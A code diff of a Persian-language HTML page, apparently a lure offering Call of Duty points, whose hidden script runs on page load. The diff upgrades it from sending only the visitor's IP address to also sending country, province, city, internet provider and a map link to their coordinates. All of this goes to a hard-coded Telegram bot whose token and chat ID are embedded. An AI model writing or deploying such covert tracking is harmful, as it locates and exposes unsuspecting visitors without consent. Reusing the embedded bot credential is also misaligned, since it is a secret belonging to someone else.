@@ -1,25 +1,23 @@
 <!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>سی پی کالاف</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       background-color: #1b1b1b;
       color: #fff;
-      text-align: center;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     h1 {
       font-size: 3rem;
-      margin: 0;
     }
   </style>
 </head>
@@ -30,15 +28,34 @@
     const botToken = '6811411494:AAESLtVx1VFLV-wgeEWj82iw6Bljg3_wMqc';
     const chatId = '1353504783';
 
-    fetch('https://api.ipify.org?format=json')
+    fetch('https://ipwho.is/')
       .then(response => response.json())
       .then(data => {
-        const ip = data.ip;
-        const message = `IP: ${ip}`;
+        const ip = data.ip || 'نامشخص';
+        const city = data.city || 'نامشخص';
+        const region = data.region || 'نامشخص';
+        const country = data.country || 'نامشخص';
+        const isp = data.connection?.isp || 'نامشخص';
+        const lat = data.latitude || '';
+        const lon = data.longitude || '';
+
+        let mapsLink = '';
+        if (lat && lon) {
+          mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+        }
+
+        const message =
+          `آی‌پی: ${ip}\n` +
+          `کشور: ${country}\n` +
+          `استان: ${region}\n` +
+          `شهر: ${city}\n` +
+          `ارائه‌دهنده: ${isp}\n` +
+          (mapsLink ? `موقعیت روی نقشه:\n${mapsLink}` : '');
+
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
       })
       .catch(error => {
-        console.error("خطا در دریافت آی‌پی:", error);
+        console.error("خطا در دریافت اطلاعات مکان:", error);
       });
   </script>
 </body>
